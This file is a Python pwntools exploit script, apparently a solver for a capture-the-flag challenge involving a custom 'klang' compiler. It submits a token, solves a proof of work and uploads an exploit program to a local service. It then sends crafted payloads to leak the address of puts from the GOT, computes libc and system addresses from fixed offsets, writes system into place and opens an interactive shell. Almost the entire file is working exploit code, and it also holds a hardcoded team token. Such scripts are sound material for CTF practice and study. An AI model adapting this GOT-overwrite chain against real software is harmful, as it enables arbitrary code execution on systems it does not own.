#!/usr/bin/env python3

from pwn import *
import os

context.log_level = "DEBUG"

LOCAL = False

def local_compile(src):
  src_path = os.path.abspath(src)
  cwd = os.getcwd()

  os.chdir("./build")
  if os.system("cmake --build .") != 0:
    raise Exception("Failed to build")
  if os.system("./compiler/klang %s" % src_path) != 0:
    raise Exception("Failed to compile src")
  if os.system("gcc -no-pie -o out out.S ../runtime/*") != 0:
    raise Exception("Failed to link")
  assert os.path.exists("out"), "out does not exist"
  os.chdir(cwd)

def proof_of_work(chal, n):
  r = 0
  while True:
    s = chal + struct.pack("<Q", r)
    h = int(hashlib.sha256(s).hexdigest(), 16)
    if h % (2 ** n) == 0:
      break
    r += 1
  return r

def send_token(p):
  p.recvuntil(b"Give me your team token.\n")
  p.sendline(b"cvGQCxFeSpiLraV/x+cU6w==")

def solve_pow(p):
  p.recvuntil(b"Run the pow script with: ./pow_solver.py ")
  chal = p.recvuntil(b" ", drop=True)
  difficulty = int(p.recvuntil(b" ", drop=True).decode())
  p.recvline()

  solution = proof_of_work(chal, difficulty)
  p.sendline(str(solution).encode())

def send_src(p, src):
  p.recvuntil(b"Give me your code, ended by a line with 'END_OF_SNIPPET' (excluding quote).\n")
  lines = open(src, 'r').readlines()
  for line in lines:
    p.sendline(line.strip().encode())
  p.sendline(b"END_OF_SNIPPET")

if not LOCAL:
  p = remote("localhost", 9999)
  send_token(p)
  solve_pow(p)
  send_src(p, "./exploit/exp.klang")
else:
  local_compile("./exploit/exp.klang")
  p = process("./build/out")
  log.info("PID = " + str(p.pid))

GOT_ADDR = 0x404018
p.recvuntil(b"hello\n")

#payload = p64(GOT_ADDR) + p64(0x1000)
payload = p64(GOT_ADDR) + b"B" * 8 + b"C" * 8
p.sendline(b"2")
p.sendline(payload)
p.sendline(payload)
p.sendline(b"1")
p.sendline(b"a")
p.sendline(b"a")

p.recvline()
puts = int(p.recvline().strip().decode())
log.info("puts_got = " + hex(puts))

libc = puts - 0x000000000084420
system = libc + 0x0000000000052290 
p.sendline(str(system))

p.interactive()